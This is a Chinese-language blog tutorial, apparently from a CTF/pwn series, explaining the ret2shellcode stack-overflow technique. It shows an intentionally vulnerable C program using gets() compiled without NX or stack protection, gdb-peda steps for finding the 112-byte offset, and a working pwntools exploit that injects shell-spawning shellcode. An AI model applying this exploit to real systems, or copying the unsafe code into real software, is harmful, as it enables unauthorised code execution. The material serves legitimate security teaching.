@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="author" content="Vancir" />
+  <title>ret2shellcode攻击技术示例</title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
+  <link rel="stylesheet" href="/media/css/style.css" />
+  <link rel="stylesheet" href="/media/css/highlight.css" />
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+  <script type="text/javascript" src="/media/js/outliner.js"></script>
+</head>
+<!--  <body> 
+-->
+<script type="text/javascript">
+  function setTimeSpan() {
+    var date = new Date();
+    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
+  }
+
+  Date.prototype.format = function (format) {
+    var o =
+      {
+        "M+": this.getMonth() + 1, //month
+        "d+": this.getDate(),    //day
+        "h+": this.getHours(),   //hour
+        "m+": this.getMinutes(), //minute
+        "s+": this.getSeconds(), //second
+        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
+        "S": this.getMilliseconds() //millisecond
+      }
+    if (/(y+)/.test(format))
+      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+    for (var k in o)
+      if (new RegExp("(" + k + ")").test(format))
+        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
+    return format;
+  }
+</script>
+
+<body onLoad="setInterval(setTimeSpan,1000);">
+  <div id="container">
+    <div id="main" role="main">
+      <header>
+        <h1>ret2shellcode攻击技术示例</h1>
+      </header>
+      <nav id="real_nav">
+        <span>
+          <a title="home" class="" href="/">home</a>
+        </span>
+        <span>
+          <a title="categories" class="" href="/categories/">categories</a>
+        </span>
+        <span>
+          <a title="tags" class="" href="/tags/">tags</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/repo/">repo</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/act/">act</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/books/">books</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/musics/">musics</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/movies/">movies</a>
+        </span>
+        <span>
+          <a title="links" class="" href="/friends/">friends</a>
+        </span>
+        <span>
+          <a title="about" class="" href="/about/">about</a>
+        </span>
+        <span>
+          <a title="feed" class="" href="/feed">subscribe</a>
+        </span>
+      </nav>
+      <article class="content">
+        <section class="meta">
+<span class="time">
+  <time datetime="2017-08-03">2017-08-03</time>
+</span>
+
+ | 
+<span class="categories">
+  categories
+  
+  <a href="/categories/#tutorials" title="tutorials">tutorials</a>&nbsp;
+  
+</span>
+
+
+ | 
+<span class="tags">
+  tags
+  
+  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
+  
+  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
+  
+  <a href="/tags/#rop" title="rop">rop</a>&nbsp;
+  
+</span>
+
+</section>
+<section class="post">
+<h2 id="什么是ret2shellcode">什么是ret2shellcode？</h2>
+
+<p>ret2shellcode 即 return to shellcode，跟ret2text类似，但是众所周知，在大多数程序中并没有像system(“/bin/sh”)这样可以直接利用的代码，因此，在没有可以直接利用的代码片段时，我们可以尝试输入一段shellcode，然后向返回地址写入shellcode地址，那么当程序返回时，就可以跳转到shellcode继续执行。</p>
+
+<p>由于shellcode是在buf缓冲区里被执行，因此我们需要保证程序没有开启NX(No executable)保护，我们可以在gcc编译时添加<em>-z execstack</em>选项来关闭该保护。</p>
+
+<h2 id="ret2shellcode示例代码">ret2shellcode示例代码</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//gcc -m32 -fno-stack-protector -z execstack ret2shellcode.c -o ret2shellcode
+</span><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"No system for you this time !!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+    <span class="n">strncpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"bye bye ~"</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>本节示例的漏洞程序也可以从此处下载：<a href="http://od7mpc53s.bkt.clouddn.com/ret2shellcode">ret2shellcode</a></p>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>如源码所示，这次程序依旧使用了不安全的函数gets()接受用户输入。另外在pwntools中已经为我们提供了可用的shellcode，如下：</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p>我的利用方法也和ret2text类似，不过这次我们需要修改的返回地址变成了shellcode的地址，而这次定位返回地址，我们换个花样 :）</p>
+
+<p>首先用gdb挂起程序后，我们使用peda的辅助功能pattern_create生成一系列的字符串，然后将其输入进buf中，因为过长的字符串会导致程序栈溢出，函数会停在返回地址处报错（因为访问了一个错误的地址），因此我们就可以直观地知道返回地址被哪个地方的哪个字符串覆盖了，从而知道buf首地址到返回地址之间的偏移。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_create 120
+<span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA'</span>
+</code></pre></div></div>
+<p>因为buf是100，因此我生成了长120的字符串保证栈溢出。接下来我们运行程序后输入这串字符</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run
+Starting program: /home/vancir/Downloads/example/ret2shellcode/ret2shellcode
+No system <span class="k">for </span>you this <span class="nb">time</span> <span class="o">!!!</span>
+AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA
+bye bye ~
+Program received signal SIGSEGV, Segmentation fault.
+</code></pre></div></div>
+<p>这里我们输入了过长字符串，因此程序提示Segmentation fault，这时我们再看程序的EIP</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EIP: 0x41384141 <span class="o">(</span><span class="s1">'AA8A'</span><span class="o">)</span>
+</code></pre></div></div>
+<p>这时的EIP的值为0x41384141，也就是在返回地址上，因为访问了一个错误的地址，所以停了下来。这时我们只需要查询0x41384141(‘AA8A’)在我们之前生成的串中的偏移</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset  0x41384141
+1094205761 found at offset: 112
+</code></pre></div></div>
+<p>得到偏移为112</p>
+
+<p>接下来我们再得到buf的首地址(因为我们的shellcode会先输入到buf中执行)，调试的时候在gets(buf)的传参时候可以得到buf的地址，因此我们可以很简单地知道buf的地址为<em>0x804a080</em>。</p>
+
+<p>那么我们进行攻击所需要的所有要素都已经收集完成啦</p>
+
+<h2 id="攻击代码">攻击代码</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+<span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x804a080</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">112</span><span class="p">,</span><span class="s">'A'</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'ret2shellcode'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+</section>
+<section align="right">
+<br/>
+<span>
+	<a  href="/2017/08/03/ret2libc%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B-%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9C%B0%E5%9D%80%E8%AE%A1%E7%AE%97system()%E5%9C%B0%E5%9D%80%E7%BB%95%E8%BF%87ASLR/" class="pageNav"  >Previous</a>
+	&nbsp;&nbsp;&nbsp;
+	<a  href="/2017/08/03/ret2syscall%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B/" class="pageNav"  >Next</a>
+</span>
+</section>
+
+<script type="text/javascript">
+$(function(){
+  $(document).keydown(function(e) {
+    var url = false;
+        if (e.which == 37 || e.which == 74) {  // Left arrow and J
+            
+        url = 'http://localhost:4000/2017/08/03/ret2libc%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B-%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9C%B0%E5%9D%80%E8%AE%A1%E7%AE%97system()%E5%9C%B0%E5%9D%80%E7%BB%95%E8%BF%87ASLR/';
+        
+        }
+        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
+            
+        url = 'http://localhost:4000/2017/08/03/ret2syscall%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B/';
+        
+        }
+        if (url) {
+            window.location = url;
+        }
+  });
+})
+</script>
+
+      </article>
+      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
+        <img src="/assets/btt.png" />
+      </a>
+    </div>
+    <footer>
+      <p>
+        <small>
+          Powered by
+          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
+          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
+          <a href="/about/">Vancir</a> |
+          <span class="label label-info" id="timeSpan"></span>
+        </small>
+      </p>
+    </footer>
+  </div>
+</body>
+
+</html>
